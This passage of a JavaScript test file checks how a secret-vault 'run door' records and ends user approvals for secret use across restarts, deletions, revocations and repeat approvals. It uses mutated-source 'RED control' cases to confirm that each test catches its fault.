      wq.door = wq.mk(mod, { now: () => clk.t, timers: { set: () => 0, clear: () => { } } });
      const h = await runHeld(wq);   // a once-grant approved and spent by a run held open
      clk.t += 1000;
      const off = wq.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });   // the owner's OFF, a second after the approval, while the run runs
      await SW.durable(path.join(wq.dataDir, 'vault-grant-ends.json'));   // (r1700's read) the spend writes its end now — what the OFF dropped has landed before the restart reads the file
      wq.door = wq.mk(mod, { now: () => clk.t, timers: { set: () => 0, clear: () => { } } });   // THE RESTART before the run ended
      const recOf = () => (wq.userTodos.resolvedOf('vault-grant-ask') || []).find((x) => x.resolvedBy === 'granted');
      for (let k = 0; k < 200 && !((recOf() || {}).resolvedFact || {}).endedAt; k++) await new Promise((r) => setImmediate(r));   // the start's sweep ended the approval's record
      const listed = wq.door.usesFor(c8).ended.map((e) => e.endedBy);
      const r = await wq.door.run({ caller: c8, args: ENV('env'), cwd: wq.work });
      h.ac.abort(); await h.pr;   // the old run ends (its door's own business)
      return { running: h.running, off: !!(off && off.ok !== false), recordEnd: ((recOf() || {}).resolvedFact || {}).endedBy || null, listed, code: r.code, offWords: typeof r.words === 'string' && /it already was when they approved/.test(r.words) };
    };
    const otr = await offThenRestart(DOOR);
    ok(otr.running && otr.off && otr.recordEnd === 'restart' && otr.listed.length === 0 && otr.code === 'entry_not_runnable' && !otr.offWords, `the read: an OFF while the run ran, then a restart — the OFF stays the owner's news (no «restart» said over it; the run refused entry_not_runnable) — ${JSON.stringify(otr)}`, otr);
    const motr = M.load('src/server/vault-run-door.js', anchored(SRCa, '  const offSinceOf = (d, id) => Math.max(offAt.get(id) || 0, d && d.touched ? Number(d.touched[id]) || 0 : 0);', '  const offSinceOf = (d, id) => offAt.get(id) || 0;', 'test-vault-run B-a14b remainder: the OFF from memory alone'), 'a14b-off-restart');
    const otrR = await offThenRestart(motr);
    ok(otrR.listed.join() === 'restart' && otrR.code === 'grant_expired' && otrR.offWords, `RED control: the OFF read from memory alone ⇒ after the restart «restart» is said over the owner's OFF, with «it already was when they approved» — false — ${JSON.stringify(otrR)}`, otrR);
    // r1700 (1): a once-grant SPENT by a run still running at the restart — its spend said «used» (the first end stands), so the start
    // writes no «restart» over it: `uses` lists «used» dated at the spend, the run is refused saying its one run was used, the record
    // says «used» at the spend. RED: no end written at the spend ⇒ «restart». r1700 (2), the run in flight: the entry DELETED while
    // that run runs (the door's forget — both of the paste door's deletes call it: a free entry's and an agent's own), then the restart: nothing listed for the gone entry,
    // the record «used» at the spend. RED: the delete that skips the run in flight ⇒ «restart» listed for an entry that is gone.
    // (the read) a SECOND approval of the pair (8 hours) while that run runs, then the restart: the first record «used» at its spend,
    // the second «restart». RED: the new approval that drops the pair's end alone ⇒ the first record «restart»
    const spentRestart = async (mod, { forget = false, again = false } = {}) => {
      const wq = await world(), clk = { t: Date.now() }, endsF = path.join(wq.dataDir, 'vault-grant-ends.json');
      wq.door = wq.mk(mod, { now: () => clk.t, timers: { set: () => 0, clear: () => { } } });
      const h = await runHeld(wq);   // approved and spent at clk.t, its run held open
      const spentAt = clk.t;
      clk.t += 1000;
      const fe = forget ? wq.door.forgetEntry('mounts:m1#secretKey') : null;
      const q2 = again ? wq.door.request({ caller: c8, entry: M1, purpose: 'a second approval meanwhile' }) : null;
      const a2 = q2 ? wq.door.answerRequest(q2.askId, { answer: '8h', reauthed: true, person: true }) : null;
      await SW.durable(endsF);   // what the spend (and the delete) wrote has landed: a restart reads the file
      wq.door = wq.mk(mod, { now: () => clk.t, timers: { set: () => 0, clear: () => { } } });   // THE RESTART while the run still runs
      const recOf = (gf = 'once') => (wq.userTodos.resolvedOf('vault-grant-ask') || []).find((x) => x.resolvedBy === 'granted' && (x.resolvedFact || {}).grantedFor === gf);
      for (let k = 0; k < 200 && !(((recOf() || {}).resolvedFact || {}).endedAt && (!again || ((recOf('8h') || {}).resolvedFact || {}).endedAt)); k++) await new Promise((r) => setImmediate(r));   // the records have their ends
      const e0 = wq.door.usesFor(c8).ended[0] || null;
      const r = forget || again ? null : await wq.door.run({ caller: c8, args: ENV('env'), cwd: wq.work });
      const f = (recOf() || {}).resolvedFact || {}, f2 = again ? (recOf('8h') || {}).resolvedFact || {} : null;
      h.ac.abort(); await h.pr;   // the old run ends (its door's own business)
      return { running: h.running, forgot: forget ? !!(fe && fe.ok) : null, listed: e0 ? { endedBy: e0.endedBy, atSpend: Date.parse(e0.endedAt) === spentAt } : null, code: r ? r.code : null, usedWords: !!(r && typeof r.words === 'string' && /its one run was used at/.test(r.words)), recordEnd: f.endedBy || null, recordAtSpend: Number(f.endedAt) === spentAt, ...(again ? { again: !!(a2 && a2.ok), againEnd: f2.endedBy || null } : {}) };
    };
    const spr = await spentRestart(DOOR);
    ok(spr.running && spr.listed && spr.listed.endedBy === 'used' && spr.listed.atSpend && spr.code === 'grant_expired' && spr.usedWords && spr.recordEnd === 'used' && spr.recordAtSpend,
      `r1700 (1): a once-grant spent by a run still running at the restart — the first end stands: «used» dated at the spend in \`uses\`, the run told its one run was used, the record «used» — ${JSON.stringify(spr)}`, spr);
    const mspr = M.load('src/server/vault-run-door.js', anchored(SRCa, " noteEnded(a.g, 'used', a.g.spentAt); inFlight.add(a.g); }", ' inFlight.add(a.g); }', 'test-vault-run r1700: no end written at the spend'), 'a14b-spent-restart');
    const sprR = await spentRestart(mspr);
    ok(sprR.running && sprR.listed && sprR.listed.endedBy === 'restart' && sprR.recordEnd === 'restart', `RED control: no end written at the spend ⇒ the restart is said over the run that used it — ${JSON.stringify(sprR)}`, sprR);
    const spf = await spentRestart(DOOR, { forget: true });
    ok(spf.running && spf.forgot && !spf.listed && spf.recordEnd === 'used' && spf.recordAtSpend, `r1700 (2): the entry deleted while a run that spent its once-grant runs, then a restart — nothing listed for the gone entry, the record «used» at the spend — ${JSON.stringify(spf)}`, spf);
    const mspf = M.load('src/server/vault-run-door.js', anchored(SRCa, "    for (const g of [...inFlight]) if (g && Array.isArray(g.entries) && g.entries.includes(key)) { if (g.ran) grantEnded(g, 'used'); else if (!g.pendingEnd) g.pendingEnd = { by: 'deleted', at: now() }; dropped++; }\n", '', 'test-vault-run r1700: the delete skips the run in flight'), 'a14b-spent-forget');
    const spfR = await spentRestart(mspf, { forget: true });
    ok(spfR.running && spfR.listed && spfR.listed.endedBy === 'restart' && spfR.recordEnd === 'restart', `RED control: the delete that skips the run in flight ⇒ after the restart «restart» is listed for an entry that no longer exists — ${JSON.stringify(spfR)}`, spfR);
    const spa = await spentRestart(DOOR, { again: true });
    ok(spa.running && spa.again && spa.recordEnd === 'used' && spa.recordAtSpend && spa.againEnd === 'restart' && spa.listed && spa.listed.endedBy === 'restart', `(the read) a second approval of the pair while the run that spent the first runs, then a restart — the first record «used» at its spend, the second «restart» (\`uses\`: the newest, «restart») — ${JSON.stringify(spa)}`, spa);
    const mspa = M.load('src/server/vault-run-door.js', anchored(SRCa, '    grants.set(q.pair, g);\n    endInFlight(q.scope, q.id);\n', '    grants.set(q.pair, g);\n', 'test-vault-run r1700 read: the new approval drops the pair end alone'), 'a14b-spent-again');
    const spaR = await spentRestart(mspa, { again: true });
    ok(spaR.running && spaR.again && spaR.recordEnd === 'restart' && spaR.againEnd === 'restart', `RED control: the new approval that drops the pair's end alone ⇒ the first record says «restart» over the run that used it — ${JSON.stringify(spaR)}`, spaR);
    // (the second read) EVERY road where an approval deletes its pair's end ends a spent in-flight once-grant of that pair first —
    // the 8-hour / once road (the leg above) AND the standing road (its approval needs the use-grants store this world does not
    // build): a census of the door's text — each `endedGrants.delete(q.…)` stands right after `endInFlight(q.scope, q.id);`. RED:
    // the standing road without it
    const inFlightCensus = (src) => { const ls = String(src).split('\n'), at = ls.map((l, i) => (/endedGrants\.delete\(q\./.test(l) ? i : -1)).filter((i) => i >= 0); return { sites: at.length, bare: at.filter((i) => !/^\s*endInFlight\(q\.scope, q\.id\);\s*$/.test(ls[i - 1] || '')).map((i) => ls[i].trim().slice(0, 70)) }; };
    const icz = inFlightCensus(SRCa);
    ok(icz.sites === 2 && icz.bare.length === 0, `(the second read) both roads that delete a pair's end on a new approval (the 8-hour / once road, the standing road) end a spent in-flight once-grant of the pair first — ${JSON.stringify(icz)}`, icz);
    const iczR = inFlightCensus(anchored(SRCa, '      endInFlight(q.scope, q.id);\n      if (endedGrants.delete(q.quietPair)) endsSave();', '      if (endedGrants.delete(q.quietPair)) endsSave();', 'test-vault-run r1700 read 2: the standing road without endInFlight'));
    ok(iczR.sites === 2 && iczR.bare.length === 1 && /q\.quietPair/.test(iczR.bare[0] || ''), `RED control: the standing road without endInFlight ⇒ the census names it — ${JSON.stringify(iczR)}`, iczR);
    // r1700 (1), its take-back: a BURNED run (nothing ran — its run folder never made) gives its once-grant back, and takes back the
    // «used» its spend wrote: a restart then ends that live approval «restart», never «used». RED: no take-back ⇒ «used» said of a
    // run that never ran
    const burnedRestart = async (mod) => {
      const wb3 = await world(); let burn = false;
      wb3.door = wb3.mk(mod, { runRoot: () => (burn ? path.join(wb3.dir, 'run-never-made') : wb3.runRoot), timers: { set: () => 0, clear: () => { } } });
      const qb3 = wb3.door.request({ caller: c8, entry: M1, purpose: 'a run that burns, then a restart' });
      wb3.door.answerRequest(qb3.askId, { answer: 'once', reauthed: true, person: true });
      burn = true;
      const code = (await runAnswered(wb3, ENV('env'), { caller: c8 })).r.code;
      burn = false;
      const givenBack = [...wb3.door._grants.values()].filter((g) => g.conv === c8.scope && g.once).length;
      await SW.durable(path.join(wb3.dataDir, 'vault-grant-ends.json'));
      wb3.door = wb3.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // THE RESTART
      const recOf = () => (wb3.userTodos.resolvedOf('vault-grant-ask') || []).find((x) => x.resolvedBy === 'granted');
      for (let k = 0; k < 200 && !((recOf() || {}).resolvedFact || {}).endedAt; k++) await new Promise((r) => setImmediate(r));
      return { code, givenBack, recordEnd: ((recOf() || {}).resolvedFact || {}).endedBy || null, listed: wb3.door.usesFor(c8).ended.map((e) => e.endedBy) };
    };
    const brs = await burnedRestart(DOOR);
    ok(brs.code === 'spawn_failed' && brs.givenBack === 1 && brs.recordEnd === 'restart' && brs.listed.join() === 'restart', `r1700 (1): a burned run takes back the «used» its spend wrote — the approval given back ends «restart» at the restart — ${JSON.stringify(brs)}`, brs);
    const mbrs = M.load('src/server/vault-run-door.js', anchored(SRCa, ' if (burned) for (const a of spent) unsayUse(a.g);', '', 'test-vault-run r1700: no take-back'), 'a14b-burned-restart');
    const brsR = await burnedRestart(mbrs);
    ok(brsR.code === 'spawn_failed' && brsR.recordEnd === 'used' && brsR.listed.join() === 'used', `RED control: no take-back on a burned run ⇒ the restart says «its one run was used» of a run that never ran — ${JSON.stringify(brsR)}`, brsR);
    // r1700 (2): an entry DELETED while a grant to it is live: the grant and its record end there («deleted», its own word — r1825); a later restart writes
    // no end for the entry and `uses` offers no «ask again» for it. RED: the delete that leaves the live grant ⇒ «restart» listed
    const deletedLive = async (mod) => {
      const wd2 = await world();
      wd2.door = wd2.mk(mod, { timers: { set: () => 0, clear: () => { } } });
      const qd = wd2.door.request({ caller: c8, entry: M1, purpose: 'an entry deleted meanwhile' });
      wd2.door.answerRequest(qd.askId, { answer: '8h', reauthed: true, person: true });
      const g = [...wd2.door._grants.values()].find((x) => x.conv === c8.scope), todoId = g ? g.todoId : null;
      const recEnd = () => (((wd2.userTodos.get(todoId) || {}).resolvedFact || {}).endedBy) || null;
      wd2.door._seen.set('pair-seen-r1700', { at: Date.now(), entries: ['mounts:m1#secretKey'] });   // a shape the owner allowed once this unlock, naming the entry
      const fe = wd2.door.forgetEntry('mounts:m1#secretKey');   // the entry deleted (the door's forget — both of the paste door's deletes call it: a free entry's and an agent's own)
      const afterForget = { grants: [...wd2.door._grants.values()].filter((x) => x.conv === c8.scope).length, recordEnd: recEnd(), seen: wd2.door._seen.has('pair-seen-r1700') };
      wd2.door = wd2.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // THE RESTART
      for (let k = 0; k < 200 && !recEnd(); k++) await new Promise((r) => setImmediate(r));   // the record has its end (at the delete, or at the start)
      return { todo: !!todoId, forgot: !!(fe && fe.ok), afterForget, recordEnd: recEnd(), listed: wd2.door.usesFor(c8).ended.map((e) => e.endedBy) };
    };
    const dlv = await deletedLive(DOOR);
    ok(dlv.todo && dlv.forgot && dlv.afterForget.grants === 0 && !dlv.afterForget.seen && dlv.afterForget.recordEnd === 'deleted' && dlv.recordEnd === 'deleted' && dlv.listed.length === 0, `r1700 (2): an entry deleted while a grant to it is live — the grant and its record end there («deleted», its own word — r1825); after a restart \`uses\` offers nothing for the gone entry — ${JSON.stringify(dlv)}`, dlv);
    const mdlv = M.load('src/server/vault-run-door.js', anchored(SRCa, "    for (const [p, g] of [...grants]) if (g && Array.isArray(g.entries) && g.entries.includes(key)) { grants.delete(p); grantEnded(g, 'deleted'); dropped++; }\n", '', 'test-vault-run r1700: the delete leaves the live grant'), 'a14b-deleted-live');
    const dlvR = await deletedLive(mdlv);
    ok(dlvR.afterForget.grants === 1 && dlvR.recordEnd === 'restart' && dlvR.listed.join() === 'restart', `RED control: the delete that leaves the live grant ⇒ after a restart «restart» is listed for an entry that no longer exists — ${JSON.stringify(dlvR)}`, dlvR);
    const mdls = M.load('src/server/vault-run-door.js', anchored(SRCa, "    for (const [p, x] of [...seen]) if (x && Array.isArray(x.entries) && x.entries.includes(key)) { seen.delete(p); dropped++; }", '', 'test-vault-run r1700 read: the delete leaves the seen shape'), 'a14b-deleted-seen');
    const dlsR = await deletedLive(mdls);
    ok(dlsR.afterForget.seen && dlsR.afterForget.grants === 0, `RED control: the delete that leaves the seen shape ⇒ a shape the owner allowed for the gone entry outlives it (a value pasted later under the name would run it with no card) — ${JSON.stringify(dlsR.afterForget)}`, dlsR);
    // r1700 (3): a For-you store with NO whenRead that is not read yet (every noteFact refused): the start's sweep says ONE line for
    // all its records, their count named. RED: a line a record
    const sweepLog = async (mod) => {
      const wl3 = await world(), lines = [];
      const t1 = Date.now(), recs = [1, 2, 3].map((n) => ({ id: `rec-${n}`, status: 'done', resolvedBy: 'granted', action: { type: 'vault-grant-ask', askId: `ask-${n}` }, resolvedFact: { grantedFor: '8h', until: t1 + 3600e3, conv: c8.scope, entry: 'mounts:m1#secretKey', at: t1 - 1000, purpose: 'p' } }));
      const ut = new Proxy(wl3.userTodos, { get: (tt, k) => (k === 'whenRead' ? undefined : k === 'noteFact' ? () => { throw new Error('the For-you store is not read yet'); } : k === 'resolvedOf' ? (type) => (type === 'vault-grant-ask' ? recs.map((x) => ({ ...x })) : tt.resolvedOf(type)) : typeof tt[k] === 'function' ? tt[k].bind(tt) : tt[k]) });
      wl3.mk(mod, { userTodos: ut, log: (m) => lines.push(String(m)), timers: { set: () => 0, clear: () => { } } });
      const said = lines.filter((m) => /could not be ended at the start/.test(m));
      return { said: said.length, lines: said };
    };
    const swl = await sweepLog(DOOR);
    ok(swl.said === 1 && /^3 of 3 live approval record\(s\) could not be ended at the start \(the first: the For-you store is not read yet\)$/.test(swl.lines[0] || ''), `r1700 (3): a store not read yet refuses every record — ONE line for the whole sweep, its count named — ${JSON.stringify(swl)}`, swl);
    const mswl = M.load('src/server/vault-run-door.js', anchored(SRCa, "catch (e) { if (!failed++) why = (e && e.message) || String(e); }", "catch (e) { if (!failed++) why = (e && e.message) || String(e); log(`a live approval's record could not be ended at the start (${(e && e.message) || e})`); }", 'test-vault-run r1700: a line a record'), 'a14b-sweep-log');
    const swlR = await sweepLog(mswl);
    ok(swlR.said === 4, `RED control: a line a record ⇒ the log says it four times for three records — ${JSON.stringify({ said: swlR.said })}`, swlR);
    // B-a14b's last remainder (r1823/r1834) (2): the run card's 8-hour «Always» on the road WITH the use-grants store (the hub's one
    // wiring, src/server/mounts-plugins-wiring.js) is a STANDING member — this conversation × the card's hosts × until — the store's
    // own row; its record NAMES that member (principal + entries) and keeps the row's OWN until (one value). A restart ends nothing:
    // the start asks the row, the card stays live, the same command runs with no card. A ✕ of the member in the Vault window then
    // tells the card «revoked». On the road WITHOUT the store (memory: no production wiring) the restart did end it — «restart»,
    // and the command draws its card again. REDs: the release's stamp (the start that asks no row); the ✕ that tells no card
    const alwaysRestart = async (mod, { store = true } = {}) => {
      const VUGa = R('src/server/vault-use-grants.js'), GSa = R('src/server/grants-store.js'), FAa = R('src/foryou-actions.js');
      const wa = await world(), gsa = GSa.create({ memory: true });
      const uga = store ? VUGa.create({ grants: () => gsa, vault: wa.vault, dataDir: wa.dataDir, log: (m) => wa.logs.push(String(m)) }) : null;
      const mkA = () => (uga ? wa.mk(mod, { useGrants: uga, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }) : wa.mk(mod));
      wa.door = mkA(); openRow(wa);
      const a8 = await runAnswered(wa, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '8h' });
      const cardId = a8.card ? a8.card.id : null;
      const f0 = ((cardId ? wa.userTodos.get(cardId) : null) || {}).resolvedFact || {};
      let rowUntil = false;
      if (uga && typeof f0.principal === 'string') { const m = (uga.publicFor('mounts:m1#secretKey').to || []).find((x) => x.principal === f0.principal); rowUntil = !!(m && (m.scopes || []).some((x) => Number(x.until) === Number(f0.until))); }
      wa.door = mkA();   // THE RESTART: a new door over the same data (and the same grants store)
      for (let k = 0; k < 20; k++) await new Promise((r) => setImmediate(r));   // the start's sweeps have run
      const it = cardId ? wa.userTodos.get(cardId) : null, f = (it && it.resolvedFact) || {};
      const after = await runAnswered(wa, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/b'], { answer: 'deny' });
      const out = { always: !!(a8.r && a8.r.ok && a8.a && a8.a.ok), alwaysFor: f.alwaysFor || null, named: typeof f0.principal === 'string' && Array.isArray(f0.entries) && f0.entries.includes('mounts:m1#secretKey'), rowUntil, recordEnd: f.endedBy || null, state: it ? FAa.decisionCard(it).state : null, ranNoCard: !!(after.r && after.r.ok) && !after.card, cardAgain: !!after.card };
      if (uga && typeof f0.principal === 'string') {   // the ✕ in the Vault window (the owner's take-back of that member)
        const tb = wa.door.takeBack({ id: 'mounts:m1#secretKey', principal: f0.principal, by: 'user' });
        const it2 = cardId ? wa.userTodos.get(cardId) : null;
        out.takeBack = { ok: !!(tb && tb.ok), recordEnd: ((it2 && it2.resolvedFact) || {}).endedBy || null, state: it2 ? FAa.decisionCard(it2).state : null };
      }
      return out;
    };
    const arc = await alwaysRestart(DOOR);
    ok(arc.always && arc.alwaysFor === '8h' && arc.named && arc.rowUntil && !arc.recordEnd && arc.state !== 'ended' && arc.ranNoCard, `B-a14b's last remainder (2): the run card's 8-hour «Always» with the use-grants store — its record names its member and keeps the row's own until; a restart ends nothing: the card stays live, the same command runs with no card — ${JSON.stringify(arc)}`, arc);
    ok(arc.takeBack && arc.takeBack.ok && arc.takeBack.recordEnd === 'revoked' && arc.takeBack.state === 'revoked', `(r1834) the member's ✕ in the Vault window ⇒ its card says «revoked», as the 1-hour window's does — ${JSON.stringify(arc.takeBack)}`, arc.takeBack);
    const marc = M.load('src/server/vault-run-door.js', anchored(SRCa, "const end = says === 'memory' ? (f.alwaysFor === '8h' ? 'restart' : null) : says === 'replaced' ? 'replaced' : says === 'gone' ? 'revoked' : null;", "const end = f.alwaysFor === '8h' ? 'restart' : null;", "test-vault-run r1834: the release's stamp (the start asks no row)"), 'a14b-always-restart');
    const arcR = await alwaysRestart(marc);
    ok(arcR.always && arcR.recordEnd === 'restart' && arcR.state === 'ended' && arcR.ranNoCard, `RED control: the release's stamp — the start that asks no row says «ended · restart» while the member still lets the command run with no card — ${JSON.stringify(arcR)}`, arcR);
    const marc2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "    let toldA = 0; if (r && r.ok && scope !== 'window') { try { toldA = alwaysTakenBack(String(id), 'revoked', pk); } catch { } }", '    let toldA = 0;', 'test-vault-run r1834: the ✕ that tells no card'), 'a14b-always-takeback');
    const arcR2 = await alwaysRestart(marc2);
    ok(arcR2.takeBack && arcR2.takeBack.ok && !arcR2.takeBack.recordEnd && arcR2.takeBack.state !== 'revoked', `RED control: the ✕ that tells no card ⇒ the card still reads «always allowed» after the owner took its member back — ${JSON.stringify(arcR2.takeBack)}`, arcR2);
    const arm = await alwaysRestart(DOOR, { store: false });
    ok(arm.always && !arm.named && arm.recordEnd === 'restart' && arm.state === 'ended' && arm.cardAgain, `(r1834) the road WITHOUT the store (memory — no production wiring): the restart did end the 8-hour «Always»: «ended · restart», and the command draws its card again — ${JSON.stringify(arm)}`, arm);
    // (r1834's reads) a member whose END MOVED by a road that told no card (here: the store written directly — as a change made while
    // For you was held unread): the START, at For you's read, catches up what the row says — «replaced». RED: the start that tells
    // only the memory road (the read's third form) ⇒ the card keeps «always allowed» over a grant the row no longer says
    const alwaysMoved = async (mod, { shift = -3600e3 } = {}) => {
      const VUGm = R('src/server/vault-use-grants.js'), GSm = R('src/server/grants-store.js'), FAm = R('src/foryou-actions.js');
      const wm = await world(), gsm = GSm.create({ memory: true });
      const ugm = VUGm.create({ grants: () => gsm, vault: wm.vault, dataDir: wm.dataDir, log: (m) => wm.logs.push(String(m)) });
      const mkM = () => wm.mk(mod, { useGrants: ugm, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) });
      wm.door = mkM(); openRow(wm);
      const ID = 'mounts:m1#secretKey';
      const a8 = await runAnswered(wm, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '8h' });
      const cardId = a8.card ? a8.card.id : null;
      const recOf = () => ((cardId ? wm.userTodos.get(cardId) : null) || {});
      const f0 = recOf().resolvedFact || {}, pk = f0.principal, later = Number(f0.until) + shift;   // r2175 (1): EARLIER by default (a later move is held)
      const moved = ugm.addMember(ID, { kind: 'conversation', key: wm.caller.conversationId, name: 'Lane X' }, { hosts: ['api.example.com'], until: later, source: 'owner' });
      const scopesNow = ((ugm.publicFor(ID).to || []).find((x) => x.principal === pk) || {}).scopes || [];
      const before = (recOf().resolvedFact || {}).endedBy || null;   // nothing told it: the store was written directly
      wm.door = mkM();   // THE RESTART (its read)
      for (let k = 0; k < 20; k++) await new Promise((r) => setImmediate(r));
      return { pressed: !!(a8.a && a8.a.ok), moved: !!(moved && moved.ok) && scopesNow.some((x) => Number(x.until) === later) && !scopesNow.some((x) => Number(x.until) === Number(f0.until)), before, end: (recOf().resolvedFact || {}).endedBy || null, state: FAm.decisionCard(recOf()).state };
    };
    const amv = await alwaysMoved(DOOR), amvL = await alwaysMoved(DOOR, { shift: 30 * 86400e3 });
    ok(amvL.pressed && amvL.moved && !amvL.end && amvL.state !== 'ended', `r2175 (1): a member whose end moved LATER with no card told: the start leaves the card «always allowed» — ${JSON.stringify(amvL)}`, amvL);
    ok(amv.pressed && amv.moved && !amv.before && amv.end === 'replaced' && amv.state === 'ended', `(r1834's reads) a member whose end moved EARLIER with no card told: the start catches up what the row says — «replaced» — ${JSON.stringify(amv)}`, amv);
    const mamv = M.load('src/server/vault-run-door.js', anchored(SRCa, " : says === 'replaced' ? 'replaced' : says === 'gone' ? 'revoked' : null;", ' : null;', 'test-vault-run r1834 read 4: the start that tells only the memory road'), 'a14b-always-moved');
    const amvR = await alwaysMoved(mamv);
    ok(amvR.moved && !amvR.end, `RED control: the start that tells only the memory road ⇒ the card keeps «always allowed» over a grant the row no longer says — ${JSON.stringify(amvR)}`, amvR);
    // (the fifth read) the start's catch-up of a GONE scope, on a 30-day card (any «Always», not the 8-hour one alone): its
    // member revoked in the store directly (a road that told no card — as one made while For you was held unread), then a
    // restart ⇒ «revoked». RED: the catch-up that leaves a gone scope unsaid
    const alwaysGone = async (mod) => {
      const VUGg = R('src/server/vault-use-grants.js'), GSg = R('src/server/grants-store.js'), FAg = R('src/foryou-actions.js');
      const wg = await world(), gsg = GSg.create({ memory: true });
      const ugg = VUGg.create({ grants: () => gsg, vault: wg.vault, dataDir: wg.dataDir, log: (m) => wg.logs.push(String(m)) });
      const mkG = () => wg.mk(mod, { useGrants: ugg, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) });
      wg.door = mkG(); openRow(wg);
      const ID = 'mounts:m1#secretKey';
      const c30 = await runAnswered(wg, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '30d' });
      const cardId = c30.card ? c30.card.id : null, recOf = () => ((cardId ? wg.userTodos.get(cardId) : null) || {}), f0 = recOf().resolvedFact || {};
      const rv = ugg.revoke(ID, f0.principal, { by: 'user' });   // the store written directly: no card told
      const before = (recOf().resolvedFact || {}).endedBy || null;
      wg.door = mkG();   // THE RESTART (its read)
      for (let k = 0; k < 20; k++) await new Promise((r) => setImmediate(r));
      return { pressed: !!(c30.a && c30.a.ok), alwaysFor: f0.alwaysFor || null, revoked: !!(rv && rv.ok), before, end: (recOf().resolvedFact || {}).endedBy || null, state: FAg.decisionCard(recOf()).state };
    };
    const agn = await alwaysGone(DOOR);
    ok(agn.pressed && agn.alwaysFor === '30d' && agn.revoked && !agn.before && agn.end === 'revoked' && agn.state === 'revoked', `(the fifth read) a 30-day card whose scope is gone with no card told: the start catches it up — «revoked» — ${JSON.stringify(agn)}`, agn);
    const magn = M.load('src/server/vault-run-door.js', anchored(SRCa, " : says === 'gone' ? 'revoked' : null;", ' : null;', 'test-vault-run r1834 read 5: the catch-up that leaves a gone scope unsaid'), 'a14b-always-gone');
    const agnR = await alwaysGone(magn);
    ok(agnR.revoked && !agnR.end, `RED control: the catch-up that leaves a gone scope unsaid ⇒ the 30-day card keeps «always allowed» after its member was taken back — ${JSON.stringify(agnR)}`, agnR);
    // another member's ✕ tells the card nothing; its entry DELETED (its row dropped first, then the door's forget) tells it
    // «deleted». RED: the forget that tells no «Always» card
    const alwaysOther = async (mod) => {
      const VUGo = R('src/server/vault-use-grants.js'), GSo = R('src/server/grants-store.js'), FAo = R('src/foryou-actions.js');
      const wo = await world(), gso = GSo.create({ memory: true });
      const ugo = VUGo.create({ grants: () => gso, vault: wo.vault, dataDir: wo.dataDir, log: (m) => wo.logs.push(String(m)) });
      wo.door = wo.mk(mod, { useGrants: ugo, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); openRow(wo);
      const ID = 'mounts:m1#secretKey';
      const a8 = await runAnswered(wo, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '8h' });
      const cardId = a8.card ? a8.card.id : null;
      const recOf = () => ((cardId ? wo.userTodos.get(cardId) : null) || {});
      const other = ugo.addMember(ID, { kind: 'conversation', key: 'conv-y', name: 'Lane Y' }, { hosts: ['api.example.com'], source: 'owner' });
      const tbY = wo.door.takeBack({ id: ID, principal: 'conversation:conv-y', by: 'user' });   // ANOTHER member's ✕
      const afterOther = (recOf().resolvedFact || {}).endedBy || null;
      const dropped = ugo.drop(ID, { by: 'user' });   // the entry deleted: its row first …
      const fe = wo.door.forgetEntry(ID);   // … then the door's forget
      return { pressed: !!(a8.a && a8.a.ok), other: !!(other && other.ok), tbY: !!(tbY && tbY.ok), afterOther, dropped: !!(dropped && dropped.ok), forgot: !!(fe && fe.ok), end: (recOf().resolvedFact || {}).endedBy || null, state: FAo.decisionCard(recOf()).state };
    };
    const aot = await alwaysOther(DOOR);
    ok(aot.pressed && aot.other && aot.tbY && !aot.afterOther && aot.dropped && aot.forgot && aot.end === 'deleted' && aot.state === 'ended', `(r1834's reads) another member's ✕ tells the card nothing; its entry deleted tells it «deleted» — ${JSON.stringify(aot)}`, aot);
    const mamv2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "    try { alwaysTakenBack(key, 'deleted'); } catch { }", '', 'test-vault-run r1834 read: the forget that tells no «Always» card'), 'a14b-always-deleted');
    const aotR = await alwaysOther(mamv2);
    ok(aotR.forgot && !aotR.end, `RED control: the forget that tells no «Always» card ⇒ the card still reads «always allowed» for a deleted entry — ${JSON.stringify(aotR)}`, aotR);
    // (the fourth read) EVERY scope the card wrote: a card over TWO entries, then the ✕ of its member on ONE of them ⇒ «revoked»
    // (its command no longer runs as pressed). And the PRESS road: a second card over both entries pressed «Always» (30 days)
    // moves the first card's end ⇒ the first says «replaced»; a second card on the other entry alone leaves it. REDs: one listed
    // scope read as enough; the press that tells no card
    const twoEntries = async (mod, { second = null, firstTtl = '8h', secondTtl = '30d' } = {}) => {
      const VUGt = R('src/server/vault-use-grants.js'), GSt = R('src/server/grants-store.js'), FAt = R('src/foryou-actions.js');
      const wt = await world(), gst = GSt.create({ memory: true });
      const ugt = VUGt.create({ grants: () => gst, vault: wt.vault, dataDir: wt.dataDir, log: (m) => wt.logs.push(String(m)) });
      wt.door = wt.mk(mod, { useGrants: ugt, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); openRow(wt); openRow(wt, 'app-secrets:app1#item.0.1');
      const BOTH = ['--env', 'T=vault://mounts/m1/secretKey', '--env', 'U=vault://app-secrets/app1/item.0.1', '--', 'curl', '-s', 'https://api.example.com/v1/a'];
      const ONE = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'];
      const APP = ['--env', 'U=vault://app-secrets/app1/item.0.1', '--', 'curl', '-s', 'https://api.example.com/v1/b'];
      const c1 = await runAnswered(wt, second ? ONE : BOTH, { answer: 'always', reauthed: true, ttl: firstTtl });
